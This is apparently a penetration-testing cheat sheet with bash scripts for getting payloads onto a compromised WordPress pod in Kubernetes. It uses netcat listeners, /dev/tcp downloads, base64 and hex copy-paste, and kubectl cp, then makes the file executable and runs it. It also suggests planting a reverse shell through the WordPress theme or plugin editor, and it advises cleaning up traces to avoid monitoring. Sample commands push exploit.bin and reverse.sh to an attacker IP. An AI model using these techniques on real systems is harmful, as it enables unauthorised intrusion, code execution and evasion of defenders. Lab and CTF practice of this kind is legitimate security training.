

```
xfer send exploit.bin 10.10.14.5
xfer base64-encode payload.sh > payload.b64
xfer kubectl-cp reverse.sh wordpress-pod default /tmp
```

##
##

```
#!/bin/bash

set -euo pipefail

RED=$(tput setaf 1)
GRN=$(tput setaf 2)
YEL=$(tput setaf 3)
BLU=$(tput setaf 4)
RST=$(tput sgr0)

function usage() {
  cat <<EOF
Usage:
  $0 send <file> <target_ip> [port]
  $0 receive <source_ip> <port> <output_file>
  $0 base64-encode <file>
  $0 base64-decode
  $0 hex-encode <file>
  $0 hex-decode
  $0 kubectl-cp <file> <pod> <namespace> <dest_path>
  $0 rsync <source> <user@host:/dest>

Examples:
  $0 send payload.bin 10.10.14.5 9000
  $0 receive 10.10.14.5 9000 output.bin
  $0 base64-encode your_binary
  $0 hex-decode < paste hex and CTRL+D
  $0 kubectl-cp ./exploit.sh wordpress-123 abc /tmp
EOF
}

function send_file() {
  local FILE="$1"
  local IP="$2"
  local PORT="${3:-8000}"
  echo "[${GRN}+${RST}] Serving '$FILE' on TCP $PORT..."
  nc -lvnp "$PORT" < "$FILE"
}

function receive_file() {
  local HOST="$1"
  local PORT="$2"
  local OUT="$3"
  echo "[${GRN}+${RST}] Connecting to $HOST:$PORT to receive '$OUT'..."
  exec 3<>/dev/tcp/"$HOST"/"$PORT"
  cat <&3 > "$OUT"
  exec 3<&- 3>&-
  echo "[${GRN}+${RST}] Received '$OUT'."
  chmod +x "$OUT" 2>/dev/null || true
}

function base64_encode() {
  local FILE="$1"
  echo "[${GRN}+${RST}] Encoding $FILE to base64..."
  base64 "$FILE"
}

function base64_decode() {
  echo "[${YEL}!${RST}] Paste base64 content below, then CTRL+D:"
  base64 -d > decoded_file
  chmod +x decoded_file 2>/dev/null || true
  echo "[${GRN}+${RST}] Saved decoded file as 'decoded_file'"
}

function hex_encode() {
  local FILE="$1"
  echo "[${GRN}+${RST}] Encoding $FILE to hex..."
  xxd -p "$FILE"
}

function hex_decode() {
  echo "[${YEL}!${RST}] Paste hex content below, then CTRL+D:"
  xxd -r -p > decoded_file
  chmod +x decoded_file 2>/dev/null || true
  echo "[${GRN}+${RST}] Saved decoded file as 'decoded_file'"
}

function k8s_copy() {
  local FILE="$1"
  local POD="$2"
  local NAMESPACE="$3"
  local DEST="$4"
  echo "[${GRN}+${RST}] Copying '$FILE' into pod '$POD' namespace '$NAMESPACE' -> $DEST"
  kubectl cp "$FILE" "$NAMESPACE/$POD:$DEST"
  kubectl exec -n "$NAMESPACE" "$POD" -- chmod +x "$DEST/$(basename "$FILE")"
}

function fast_rsync() {
  local SRC="$1"
  local DEST="$2"
  echo "[${GRN}+${RST}] Fast rsync from '$SRC' to '$DEST'"
  rsync -aHAXxv --numeric-ids --delete --progress \
    -e "ssh -T -c arcfour -o Compression=no -x" "$SRC" "$DEST"
}

#### MAIN ####

[[ $# -lt 1 ]] && usage && exit 1

CMD="$1"; shift

case "$CMD" in
  send)             [[ $# -lt 2 ]] && usage && exit 1; send_file "$@" ;;
  receive)          [[ $# -lt 3 ]] && usage && exit 1; receive_file "$@" ;;
  base64-encode)    [[ $# -ne 1 ]] && usage && exit 1; base64_encode "$1" ;;
  base64-decode)    base64_decode ;;
  hex-encode)       [[ $# -ne 1 ]] && usage && exit 1; hex_encode "$1" ;;
  hex-decode)       hex_decode ;;
  kubectl-cp)       [[ $# -ne 4 ]] && usage && exit 1; k8s_copy "$@" ;;
  rsync)            [[ $# -ne 2 ]] && usage && exit 1; fast_rsync "$@" ;;
  *)                echo "[${RED}ERR${RST}] Unknown command: $CMD"; usage; exit 1 ;;
esac

```

## 🛰️ Modern File Transfer Toolkit

### 🔹 `transfer_file.sh`

```bash
#!/bin/bash

set -e

# Usage: ./transfer_file.sh <file_to_transfer> <target_ip> [port]
FILE="$1"
TARGET_IP="$2"
PORT="${3:-8000}"

if [[ -z "$FILE" || -z "$TARGET_IP" ]]; then
  echo -e "Usage: $0 <file_to_transfer> <target_ip> [port]"
  exit 1
fi

if [[ ! -f "$FILE" ]]; then
  echo "[!] File not found: $FILE"
  exit 1
fi

echo "[+] Serving $FILE on port $PORT using netcat..."
echo "[*] On the remote machine, run: ./receive_file.sh $HOSTNAME $PORT output_file"

nc -lvnp "$PORT" < "$FILE"
```

---

### 🔹 `receive_file.sh`

```bash
#!/bin/bash

set -e

# Usage: ./receive_file.sh <sender_ip> <port> <output_filename>
SENDER="$1"
PORT="$2"
OUTPUT="$3"

if [[ -z "$SENDER" || -z "$PORT" || -z "$OUTPUT" ]]; then
  echo -e "Usage: $0 <sender_ip> <port> <output_filename>"
  exit 1
fi

echo "[+] Connecting to $SENDER:$PORT to receive file..."
exec 3<>/dev/tcp/"$SENDER"/"$PORT"
cat <&3 > "$OUTPUT"
echo "[+] File saved to $OUTPUT"
chmod +x "$OUTPUT" 2>/dev/null || true
exec 3<&- 3>&-
```

---

### 🔹 Quick Reference Cheatsheet

#### ✅ Base64 (Copy/Paste Friendly)

```bash
base64 your_binary > binary.b64
# On pod:
cat > binary.b64  # Paste and Ctrl+D
base64 -d binary.b64 > your_binary && chmod +x your_binary
```

#### ✅ xxd Hexdump

```bash
xxd -p your_binary > binary.hex
# On pod:
cat > binary.hex  # Paste and Ctrl+D
xxd -r -p binary.hex your_binary && chmod +x your_binary
```

#### ✅ `/dev/tcp` Bash Transfer (no tools)

**Sender**

```bash
nc -lvnp 8000 < file
```

**Receiver (on pod)**

```bash
exec 3<>/dev/tcp/YOUR_IP/8000
cat <&3 > received_file
```

---

### 🔹 Optional: HTTP File Hosting (Reverse Shell Friendlier)

```bash
python3 -m http.server 8000
# On pod:
exec 3<>/dev/tcp/YOUR_IP/8000
cat <&3 > your_binary
```

---

### 🔹 Kubernetes Transfer

```bash
kubectl cp ./your_binary default/wordpress-pod:/tmp/your_binary
kubectl exec -it wordpress-pod -- chmod +x /tmp/your_binary
```

---

### 🔹 Fastest Rsync Over SSH (Archival Mode)

```bash
rsync -aHAXxv --numeric-ids --delete --progress \
-e "ssh -T -c arcfour -o Compression=no -x" \
user@host:/src_dir /dest_dir
```

---

### 🔹 Extras & Enhancements

* Add optional `--base64` or `--hex` flag to your script for encoding/decode mode.
* Add `split -b 512K` for large file chunking, use `cat x* > final_binary`.
* Consider embedding metadata (e.g. SHA256) in `.b64`/`.hex` footer.

##
##

```
#!/bin/bash

# Usage: ./transfer_file.sh <file_to_transfer> <pod_ip> [<port>]
if [ "$#" -lt 2 ]; then
  echo "Usage: $0 <file_to_transfer> <pod_ip> [<port>]"
  exit 1
fi

FILE_TO_TRANSFER=$1
POD_IP=$2
PORT=${3:-8000}

# Check if the file exists
if [ ! -f "$FILE_TO_TRANSFER" ]; then
  echo "File not found: $FILE_TO_TRANSFER"
  exit 1
fi

# Notify the user of the setup and start the listener
echo "Setting up listener on port $PORT for file transfer..."
echo "Run 'receive_file.sh' on the WordPress pod to receive the file."
nc -lvp "$PORT" < "$FILE_TO_TRANSFER"
```

##
##


```
#!/bin/bash

# Usage: ./receive_file.sh <local_machine_ip> <port> <output_filename>
if [ "$#" -lt 3 ]; then
  echo "Usage: $0 <local_machine_ip> <port> <output_filename>"
  exit 1
fi

LOCAL_MACHINE_IP=$1
PORT=$2
OUTPUT_FILE=$3

# Set up the connection and receive the file
exec 3<>/dev/tcp/$LOCAL_MACHINE_IP/$PORT
cat <&3 > "$OUTPUT_FILE"
echo "File received as $OUTPUT_FILE."
exec 3<&-  # Close input stream
exec 3>&-  # Close output stream
```


##
#
https://github.com/babywyrm/ultimate-file-transfer-list
#
##


1. Base64 Encoding + Copy/Paste
Base64 encoding is a common way to convert binary data into a text format that can be easily copied and pasted between machines. Once you paste the Base64 data, you decode it back into its binary form.

Steps:

On your local machine, encode the binary (e.g., your_binary) into Base64:

```
base64 your_binary > binary.b64
```
This converts the binary file into a long string of Base64 text.

On the WordPress pod, create a new file where you can paste the Base64 string:

```
cat > binary.b64
```

After running the command, paste the Base64 content into the pod and press Ctrl+D to save the file.

Decode the Base64 file back into the original binary:

```
base64 -d binary.b64 > your_binary
chmod +x your_binary   # Make it executable
./your_binary          # Run the binary
```

Why it works: Even without network utilities (curl, wget, etc.), most shells have cat and base64 utilities. This approach works as long as the shell supports Base64 decoding.

2. echo or printf File Transfer (Hex Dumping)
Hex dumping is another way to convert binary files into text that can be easily pasted into a terminal. It works similarly to Base64 but uses hexadecimal encoding.

Steps:

On your local machine, convert the binary file into hexadecimal using xxd:

```
xxd -p your_binary > binary.hex
```

This creates a text file containing the hexadecimal representation of the binary.

On the WordPress pod, create a file to paste the hex dump into:

```
cat > binary.hex
```

Paste the hex content and save it with Ctrl+D.

Convert the hex back into a binary file:

```
xxd -r -p binary.hex your_binary
chmod +x your_binary    # Make it executable
./your_binary           # Run the binary
```

Why it works: Like Base64, xxd is often available in shells. This method is especially useful for small files since it doesn't require additional tools.

3. Script a Reverse Shell to Transfer Files
If you can establish a reverse shell, you can use it to create a file transfer connection between your local machine and the pod. A reverse shell allows the pod to connect back to a listener on your machine.

Steps:

On your local machine, set up a simple HTTP server to host the file:

```
python3 -m http.server 8000
```

This command will serve files in the current directory over HTTP on port 8000.

On the WordPress pod, use bash to connect to your local server:

```
exec 5<>/dev/tcp/YOUR_IP/8000
cat <&5 > your_binary   # Save the incoming data into your_binary
```

After the file transfer completes, make the binary executable:

```
chmod +x your_binary
./your_binary
```
Why it works: If /dev/tcp is enabled in the shell, you can establish raw TCP connections without needing curl or nc. This approach relies on creating an outbound connection to your server.

4. Use the WordPress Filesystem
Since you are working with a WordPress pod, there may be opportunities to upload files directly via the WordPress admin interface if it is accessible.

Steps:

Access the WordPress dashboard (if possible) using a browser.
Go to Appearance > Theme Editor or Plugins > Plugin Editor.
If editing is enabled, you can upload a reverse shell script or a file containing the binary data by embedding it into PHP code. For example, you could use PHP to decode a Base64 string and save it as a file on the server.
Caution: This method is potentially noisy because changes to the WordPress site could be detected by monitoring systems. Always clean up after any changes you make.

5. Leverage Kubernetes Features
If the WordPress pod is running in a Kubernetes environment and you have some access to Kubernetes features, you may be able to use kubectl to copy files directly into the pod.

Steps:

On a machine that has Kubernetes admin privileges, use kubectl cp to copy a file from your local system into the WordPress pod:

```
kubectl cp ./your_binary default/wordpress-pod:/path/to/destination
```
Then, on the pod:

```
chmod +x /path/to/destination/your_binary
/path/to/destination/your_binary
```

Why it works: If you have access to Kubernetes admin tools like kubectl, you can directly interact with the pod’s filesystem.

6. Using /dev/tcp for Transfers
Some shells support file transfers using bash built-in TCP connections through /dev/tcp/. You can use this feature to download files from your machine.

Steps:

On your local machine, start a listener that serves the binary file:

```
nc -lvp 8000 < your_binary
```
On the WordPress pod, use bash to connect to the listener and receive the file:

```
exec 3<>/dev/tcp/YOUR_IP/8000
cat <&3 > your_binary
```

Once the file is downloaded, make it executable:

```
chmod +x your_binary
./your_binary
```

Why it works: 
/dev/tcp is a lesser-known but powerful feature in bash that can be used to establish direct TCP connections without needing extra tools like nc.


# Key Considerations:
File Size: These methods work well for smaller files (typically under a few MB). For larger files, you'll need to split them into chunks or find another solution.

Security Monitoring: Some methods (e.g., modifying WordPress files or using reverse shells) can be more easily detected by security systems or leave traces. Be mindful of any cleanup you need to do afterward.

Pod Privileges: Your ability to use these methods depends on the configuration of the shell environment. For example, /dev/tcp might not be available on every shell.



```
### The fastest remote directory rsync over ssh archival I can muster (40MB/s over 1gb NICs)

#### This creates an archive that does the following:

**rsync**
(Everyone seems to like -z, but it is much slower for me)

- a: archive mode - rescursive, preserves owner, preserves permissions, preserves modification times, preserves group, copies symlinks as symlinks, preserves device files.
- H: preserves hard-links
- A: preserves ACLs
- X: preserves extended attributes
- x: don't cross file-system boundaries
- v: increase verbosity
- --numeric-ds: don't map uid/gid values by user/group name
- --delete: delete extraneous files from dest dirs (differential clean-up during sync)
- --progress: show progress during transfer

**ssh**
- T: turn off pseudo-tty to decrease cpu load on destination.
- c arcfour: use the weakest but fastest SSH encryption. Must specify "Ciphers arcfour" in sshd_config on destination.
- o Compression=no: Turn off SSH compression.
- x: turn off X forwarding if it is on by default.

**Original**

```sh
rsync -aHAXxv --numeric-ids --delete --progress -e "ssh -T -c arcfour -o Compression=no -x" user@<source>:<source_dir> <dest_dir>
```


**Flip** 

```sh
rsync -aHAXxv --numeric-ids --delete --progress -e "ssh -T -c arcfour -o Compression=no -x" [source_dir] [dest_host:/dest_dir]
```
```
